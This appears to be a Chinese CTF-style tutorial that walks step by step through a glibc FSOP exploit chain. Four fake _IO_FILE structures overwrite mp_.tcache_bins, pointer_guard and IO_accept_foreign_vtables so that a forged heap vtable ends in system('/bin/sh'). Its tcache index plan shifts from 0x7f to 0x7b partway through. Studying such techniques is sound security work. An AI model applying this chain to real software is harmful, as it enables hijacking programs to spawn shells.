## 0. 前置条件

假设我们已经通过漏洞完成了这些事情：

```text
1. 泄露 libc_base
2. 泄露 heap_base
3. 能在堆上伪造多个 fake _IO_FILE
4. 能通过 _chain 把多个 fake _IO_FILE 串起来
5. 只有一次 largebin attack，可以把 _IO_list_all 改到 fake_IO_1
```

你前面材料里已经提到，`_IO_list_all` 是 glibc 管理 FILE 流的链表头，`_chain` 字段用来连接下一个 FILE；`exit` 时 glibc 会遍历这些 FILE 做清理和 flush。

我们布置：

```text
_IO_list_all → fake_IO_1 → fake_IO_2 → fake_IO_3 → fake_IO_4 → NULL
```

地址假设如下：

```text
fake_IO_1 = A1 = 0x555555559000
fake_IO_2 = A2 = 0x55555555a000
fake_IO_3 = A3 = 0x55555555b000
fake_IO_4 = A4 = 0x55555555c000
```

---

## 1. 先给出本例要用到的关键地址

假设：

```text
libc_base                    = 0x7ffff7dc0000

&mp_.tcache_bins             = 0x7ffff7fb85f0

pointer_guard_addr           = 0x7ffff7ffd730

IO_accept_foreign_vtables    = 0x7ffff7fb6e38

_IO_vtable_check             = 0x7ffff7e3a4b0

heap_fake_vtable             = 0x55555555d000

system                       = 0x7ffff7e12340
```

其中：

```text
mp_.tcache_bins
```

是 glibc malloc 全局参数 `mp_` 里的字段，表示 tcache 允许使用多少个 size class。默认通常是 `64`。malloc 在尝试 tcache 分配时，会检查 `tc_idx < mp_.tcache_bins`；`mp_` 是 libc 内部的全局 malloc 参数结构，`malloc_par` 中包含 `tcache_bins` 字段。([codebrowser.dev][1])

`pointer_guard` 是 TLS / TCB 里的指针混淆随机值。x86-64 glibc 的 `PTR_MANGLE` 大致是：

```text
ptr ^= pointer_guard
ptr = rol(ptr, 17)
```

源码里的 `pointer_guard.h` 也能看到 x86-64 下 `PTR_MANGLE` 使用 `xor %fs:POINTER_GUARD` 和 `rol $2*LP_SIZE+1`，64 位下就是左旋 17 位；`PTR_DEMANGLE` 则反向右旋再 xor。([codebrowser.dev][2])

`IO_accept_foreign_vtables` 是 libio vtable 检查相关变量。如果 `FILE->vtable` 不在合法 `__libc_IO_vtables` 段里，glibc 会进入 `_IO_vtable_check`；而 `_IO_vtable_check` 会读取 `IO_accept_foreign_vtables`，经过 `PTR_DEMANGLE` 后如果等于 `_IO_vtable_check`，就接受 foreign vtable。([codebrowser.dev][3])

---

## 2. fake_IO_1：修改 `mp_.tcache_bins`

第一个 fake FILE 的作用是利用：

```text
_IO_wstrn_overflow
```

把 `mp_.tcache_bins` 改成一个很大的堆地址。

`_IO_wstrn_overflow` 的特点是：如果：

```text
fake_IO_1 地址 = A1
fake_IO_1->_wide_data = B
```

那么它会把 `B` 到 `B+0x38` 这些 `_IO_wide_data` 指针槽位写成：

```text
A1 + 0xf0
A1 + 0x1f0
```

也就是已知堆地址。

这里我们利用其中一项：

```text
B + 0x20 = A1 + 0xf0
```

为了让：

```text
mp_.tcache_bins = A1 + 0xf0
```

就设置：

```text
B = &mp_.tcache_bins - 0x20
```

代入本例地址：

```text
B = 0x7ffff7fb85f0 - 0x20
  = 0x7ffff7fb85d0
```

所以 fake_IO_1 关键字段设置为：

```text
fake_IO_1->vtable     = _IO_wstrn_jumps
fake_IO_1->_wide_data = 0x7ffff7fb85d0
fake_IO_1->_chain     = fake_IO_2
```

触发 `exit` 后，glibc 遍历到 fake_IO_1，调用：

```text
_IO_OVERFLOW(fake_IO_1, EOF)
```

由于：

```text
fake_IO_1->vtable = _IO_wstrn_jumps
```

所以实际进入：

```text
_IO_wstrn_overflow(fake_IO_1, EOF)
```

执行后：

```text
mp_.tcache_bins:
原值 = 0x40
新值 = A1 + 0xf0 = 0x5555555590f0
```

这个值非常大，所以后续很大的 `tc_idx` 也能通过：

```c
tc_idx < mp_.tcache_bins
```

---

## 3. 准备 tcache 越界项

正常 tcache 只有 64 个 bin：

```text
idx = 0 ~ 63
```

但现在 `mp_.tcache_bins` 被改得很大，malloc 会允许更大的 `idx` 进入 tcache 检查。

假设真实 tcache 结构地址是：

```text
tcache = T = 0x555555557000
```

假设当前 glibc 的 `tcache_perthread_struct` 布局是：

```text
counts[]  是 uint16_t 数组
entries[] 从 T + 0x80 开始
```

源码中 `tcache_perthread_struct` 由 `counts[]` 和 `entries[]` 两个数组组成，malloc 会根据 `tc_idx` 查询 `tcache->counts[tc_idx]` 和 `tcache->entries[tc_idx]`。([codebrowser.dev][1])

我们准备两个越界 tcache 项：

```text
idx 0x6f → malloc(0x704) 返回 pointer_guard_addr
idx 0x7f → malloc(0x804) 返回 IO_accept_foreign_vtables
```

### idx 0x6f 的位置

```text
counts[0x6f]  = T + 0x6f * 2
              = 0x555555557000 + 0xde
              = 0x5555555570de

entries[0x6f] = T + 0x80 + 0x6f * 8
              = 0x555555557000 + 0x80 + 0x378
              = 0x5555555573f8
```

布置：

```text
*(uint16_t *)0x5555555570de = 1
*(uint64_t *)0x5555555573f8 = 0x7ffff7ffd730
```

也就是：

```text
tcache->counts[0x6f]  = 1
tcache->entries[0x6f] = pointer_guard_addr
```

### idx 0x7f 的位置

```text
counts[0x7f]  = T + 0x7f * 2
              = 0x555555557000 + 0xfe
              = 0x5555555570fe

entries[0x7f] = T + 0x80 + 0x7f * 8
              = 0x555555557000 + 0x80 + 0x3f8
              = 0x555555557478
```

布置：

```text
*(uint16_t *)0x5555555570fe = 1
*(uint64_t *)0x555555557478 = 0x7ffff7fb6e38
```

也就是：

```text
tcache->counts[0x7f]  = 1
tcache->entries[0x7f] = IO_accept_foreign_vtables
```

这里“布置越界项”依赖具体题目的堆布局，例如重叠 chunk、可控堆块覆盖真实 tcache 后方区域，或者前面已有的写能力。`mp_.tcache_bins` 只负责绕过 `tc_idx < mp_.tcache_bins`，它不会自动帮你布置 `counts/entries`。

---

## 4. fake_IO_2：第一次 `_IO_str_overflow`，修改 `pointer_guard`

第二个 fake FILE 用 `_IO_str_overflow`。关键代码是：

```c
old_buf = fp->_IO_buf_base;
old_blen = _IO_blen(fp);
new_size = 2 * old_blen + 100;
new_buf = malloc(new_size);
memcpy(new_buf, old_buf, old_blen);
```

这里：

```text
old_buf  = fp->_IO_buf_base
old_blen = fp->_IO_buf_end - fp->_IO_buf_base
```

所以 `old_buf` 和 `old_blen` 都由 fake_IO_2 控制。

我们想把：

```text
pointer_guard = 0
```

准备源数据：

```text
src_guard = 0x555555560000
```

内容为：

```text
0x555555560000: 00 00 00 00 00 00 00 00
```

也就是 `p64(0)`。

设置 fake_IO_2：

```text
fake_IO_2->vtable       = _IO_str_jumps
fake_IO_2->_IO_buf_base = 0x555555560000
fake_IO_2->_IO_buf_end  = 0x555555560000 + 0x350

fake_IO_2->_IO_write_base = 0x555555560000
fake_IO_2->_IO_write_ptr  = 0x555555560000 + 0x351

fake_IO_2->_chain       = fake_IO_3
```

于是：

```text
old_buf  = 0x555555560000
old_blen = 0x350
```

计算：

```text
new_size = 2 * old_blen + 100
         = 2 * 0x350 + 0x64
         = 0x704
```

`malloc(0x704)` 对应的 tcache idx 这样算：

```text
request size = 0x704
chunk_size   = align_up(0x704 + 0x8, 0x10)
             = align_up(0x70c, 0x10)
             = 0x710

tc_idx       = (0x710 - 0x20) / 0x10
             = 0x6f
```

由于前面已经布置：

```text
tcache->counts[0x6f]  = 1
tcache->entries[0x6f] = pointer_guard_addr
```

所以：

```text
malloc(0x704) = pointer_guard_addr = 0x7ffff7ffd730
```

接着：

```c
memcpy(new_buf, old_buf, old_blen);
```

变成：

```c
memcpy(0x7ffff7ffd730, 0x555555560000, 0x350);
```

结果：

```text
pointer_guard:
原值 = 0xaabbccddeeff0011
新值 = 0x0000000000000000
```

这就是第一次任意地址写任意值。

---

## 5. fake_IO_3：第二次 `_IO_str_overflow`，修改 `IO_accept_foreign_vtables`

现在：

```text
pointer_guard = 0
```

我们需要让：

```text
IO_accept_foreign_vtables = PTR_MANGLE(&_IO_vtable_check)
```

x86-64 下：

```text
PTR_MANGLE(ptr) = rol(ptr ^ pointer_guard, 17)
```

因为 `pointer_guard = 0`，所以：

```text
PTR_MANGLE(&_IO_vtable_check) = rol(_IO_vtable_check, 17)
```

本例中：

```text
_IO_vtable_check = 0x7ffff7e3a4b0
```

计算得到：

```text
rol(0x7ffff7e3a4b0, 17) = 0xffffefc749600000
```

所以我们要写：

```text
IO_accept_foreign_vtables = 0xffffefc749600000
```

准备源数据：

```text
src_accept = 0x555555561000
```

内容为：

```text
0x555555561000: 00 00 60 49 c7 ef ff ff
```

即：

```python
p64(0xffffefc749600000)
```

设置 fake_IO_3：

```text
fake_IO_3->vtable       = _IO_str_jumps
fake_IO_3->_IO_buf_base = 0x555555561000
fake_IO_3->_IO_buf_end  = 0x555555561000 + 0x3b0

fake_IO_3->_IO_write_base = 0x555555561000
fake_IO_3->_IO_write_ptr  = 0x555555561000 + 0x3b1

fake_IO_3->_chain       = fake_IO_4
```

于是：

```text
old_buf  = 0x555555561000
old_blen = 0x3b0
```

计算：

```text
new_size = 2 * 0x3b0 + 0x64
         = 0x760 + 0x64
         = 0x7c4
```

这个 request size 对应：

```text
chunk_size = align_up(0x7c4 + 0x8, 0x10)
           = align_up(0x7cc, 0x10)
           = 0x7d0

tc_idx     = (0x7d0 - 0x20) / 0x10
           = 0x7b
```

为了让它命中 `idx = 0x7b`，我们实际应该布置：

```text
tcache->counts[0x7b]  = 1
tcache->entries[0x7b] = IO_accept_foreign_vtables
```

对应地址：

```text
counts[0x7b]  = T + 0x7b * 2
              = 0x555555557000 + 0xf6
              = 0x5555555570f6

entries[0x7b] = T + 0x80 + 0x7b * 8
              = 0x555555557000 + 0x80 + 0x3d8
              = 0x555555557458
```

布置：

```text
*(uint16_t *)0x5555555570f6 = 1
*(uint64_t *)0x555555557458 = 0x7ffff7fb6e38
```

这样：

```text
malloc(0x7c4) = IO_accept_foreign_vtables
              = 0x7ffff7fb6e38
```

接着：

```c
memcpy(new_buf, old_buf, old_blen);
```

变成：

```c
memcpy(0x7ffff7fb6e38, 0x555555561000, 0x3b0);
```

结果：

```text
IO_accept_foreign_vtables:
原值 = 0x0000000000000000
新值 = 0xffffefc749600000
```

此时 `_IO_vtable_check` 里会做：

```text
flag = IO_accept_foreign_vtables
PTR_DEMANGLE(flag)
```

由于 `pointer_guard = 0`，`PTR_DEMANGLE` 会把：

```text
0xffffefc749600000
```

还原成：

```text
0x7ffff7e3a4b0
```

也就是：

```text
&_IO_vtable_check
```

于是检查通过。

---

## 6. fake_IO_4：使用堆上 fake vtable 劫持控制流

现在我们已经完成：

```text
pointer_guard = 0
IO_accept_foreign_vtables = rol(_IO_vtable_check, 17)
```

所以 glibc 会接受 foreign vtable。

接下来 fake_IO_4 可以直接使用堆上 fake vtable：

```text
fake_IO_4->vtable = heap_fake_vtable = 0x55555555d000
```

在 `heap_fake_vtable` 中布置：

```text
heap_fake_vtable + 0x18 = system
```

因为 `_IO_jump_t` 里 `__overflow` 槽位常见偏移是 `0x18`。

同时 fake_IO_4 起始位置放：

```text
fake_IO_4 + 0x00 = "/bin/sh\x00"
```

并设置其他字段满足 flush 条件：

```text
fake_IO_4->_mode <= 0
fake_IO_4->_IO_write_ptr > fake_IO_4->_IO_write_base
```

例如：

```text
fake_IO_4->_IO_write_base = 2
fake_IO_4->_IO_write_ptr  = 3
fake_IO_4->_mode          = 0
```

当 `exit` 链表继续遍历到 fake_IO_4 时：

```text
_IO_flush_all_lockp
  → _IO_OVERFLOW(fake_IO_4, EOF)
```

`_IO_OVERFLOW` 会取：

```text
fake_IO_4->vtable->__overflow
```

也就是：

```text
*(heap_fake_vtable + 0x18) = system
```

于是调用变成：

```c
system(fake_IO_4);
```

而 fake_IO_4 起始位置是：

```text
"/bin/sh\x00"
```

所以等价于：

```c
system("/bin/sh");
```

至此完成控制流劫持。

---

## 7. 整体变化过程表

### 初始状态

```text
mp_.tcache_bins              = 0x40

pointer_guard                = 0xaabbccddeeff0011

IO_accept_foreign_vtables    = 0x0

_IO_list_all                 = fake_IO_1
```

---

### fake_IO_1 之后

```text
mp_.tcache_bins:
0x40 → 0x5555555590f0
```

作用：

```text
允许大 tc_idx 也进入 tcache 检查。
```

---

### fake_IO_2 之前布置

```text
tcache->counts[0x6f]  = 1
tcache->entries[0x6f] = 0x7ffff7ffd730
```

fake_IO_2 触发：

```text
malloc(0x704) → idx 0x6f → 返回 0x7ffff7ffd730
memcpy(0x7ffff7ffd730, 0x555555560000, 0x350)
```

结果：

```text
pointer_guard:
0xaabbccddeeff0011 → 0
```

---

### fake_IO_3 之前布置

```text
tcache->counts[0x7b]  = 1
tcache->entries[0x7b] = 0x7ffff7fb6e38
```

fake_IO_3 触发：

```text
malloc(0x7c4) → idx 0x7b → 返回 0x7ffff7fb6e38
memcpy(0x7ffff7fb6e38, 0x555555561000, 0x3b0)
```

结果：

```text
IO_accept_foreign_vtables:
0x0 → 0xffffefc749600000
```

---

### fake_IO_4 触发

```text
fake_IO_4->vtable = 0x55555555d000
*(0x55555555d000 + 0x18) = system
fake_IO_4 起始内容 = "/bin/sh\x00"
```

调用：

```text
_IO_OVERFLOW(fake_IO_4, EOF)
→ heap_fake_vtable->__overflow(fake_IO_4, EOF)
→ system(fake_IO_4)
→ system("/bin/sh")
```

---

## 8. 关于 “修改 libc.got” 的替代路线

你提到的另一种说法是：

```text
利用一次任意地址写任意值修改 libc.got 里面的函数地址
```

这个思路的意思是：如果某些 IO 流函数后续会调用 `strlen`、`memcpy`、`memset`、`strcpy` 等函数，而这些调用会走可写的 GOT，那么可以直接把对应 GOT 项改成 `system` 或其他函数。

但这个路线有几个限制：

```text
1. 目标 GOT 必须可写；
2. Full RELRO 下 GOT 通常不可写；
3. 很多新版 libc 的内部调用不一定通过可写 GOT；
4. 具体调用哪个函数，要结合目标 libc 反汇编确认。
```

所以更通用的讲法是：

```text
获得任意地址写后，可以改写任意可写的函数指针或回调结构。
如果某个 GOT / hook / jump table / 结构体函数指针可写，就可以作为控制流目标。
```

而修改 `pointer_guard + IO_accept_foreign_vtables` 的好处是：它是为了重新启用堆上 fake vtable，使后续 FSOP 更自由，不依赖某个 GOT 是否可写。

---

一句话总结这个完整例子：

```text
fake_IO_1 用 _IO_wstrn_overflow 把 mp_.tcache_bins 改大；
fake_IO_2 用 _IO_str_overflow 的 malloc + memcpy 把 pointer_guard 写成 0；
fake_IO_3 再用 malloc + memcpy 把 IO_accept_foreign_vtables 写成 rol(_IO_vtable_check, 17)；
于是 _IO_vtable_check 接受堆上 fake vtable；
fake_IO_4 最后用堆上 fake vtable 的 __overflow = system，
让 _IO_OVERFLOW(fake_IO_4, EOF) 变成 system("/bin/sh")。
```
